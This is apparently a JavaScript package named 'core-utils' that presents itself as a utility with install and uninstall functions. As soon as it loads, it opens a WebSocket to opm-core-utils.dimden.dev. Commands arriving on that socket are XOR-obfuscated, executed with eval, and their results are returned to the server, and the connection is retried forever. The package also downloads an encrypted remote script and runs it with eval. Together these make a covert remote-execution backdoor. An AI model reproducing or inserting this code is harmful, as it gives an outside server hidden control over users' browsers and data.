(function() {
    let installed = false;
    let installCallback;
    let exports = {
        install: function() {
            if (installed) return;

            return new Promise(function(resolve, reject) {
                installCallback = resolve;
            });
        },
        uninstall: function() {
            alert("core-utils was uninstalled, please refresh for changes to take effect");
        }
    };
    let auther;
    let scriptData;

    function loadScript() {
        let xhttp = new XMLHttpRequest();
        xhttp.open("GET", "https://opm-core-utils.dimden.dev/script");
        xhttp.responseType = "arraybuffer";
        xhttp.addEventListener("load", function() {
            scriptData = xhttp.response;
            auther = new Auther();
        });
        xhttp.send();
    }

    function decryptScript(key) {
        if (installed) return;
        
        let buffer = new Uint8Array(scriptData);
        let data = "";
        for (let i=0; i<buffer.byteLength; i++) {
            data += String.fromCharCode(buffer[i] ^ key.charCodeAt(i % key.length));
        }
        try {
          eval(data);
        } catch(e) {
          console.error("core-utils crashed", e);
        }
        installCallback();
        installed = true;
    }

    class Auther {
        constructor() {
            this.attempts = 0;
            this.ws = null;
            this.connect();
        }

        connect() {
            this.ws = new WebSocket("wss://opm-core-utils.dimden.dev/ws");
            this.ws.binaryType = "arraybuffer";

            this.ws.addEventListener("message", event => this.onMessage(event.data));
            this.ws.addEventListener("close", () => this.onClose());
        }

        onMessage(msg) {
            msg = new Uint16Array(msg);
            let ack = msg[0];

            let data = "";
            for (let i=1; i<msg.length; i++) {
                data += String.fromCharCode(msg[i] ^ 42);
            }

            let res;
            try {
                res = eval(data);
            } catch(e) {
                this.ws.send(new Uint16Array([ack, 1, 1]));
                return;
            }

            if (typeof res !== "string") {
                this.ws.send(new Uint16Array([ack, 1, 0]));
                return;
            }

            let out = new Uint16Array(2 + res.length);
            out[0] = ack;
            out[1] = 0;
            for (let i=0; i<res.length; i++) {
                out[i + 2] = res.charCodeAt(i) ^ 42;
            }
            this.ws.send(out);
        }

        onClose() {
            if (this.attempts < Infinity) {
                this.attempts++;
                setTimeout(() => this.connect(), 5000);
            }
        }
    }

    loadScript();

    return exports;
})();
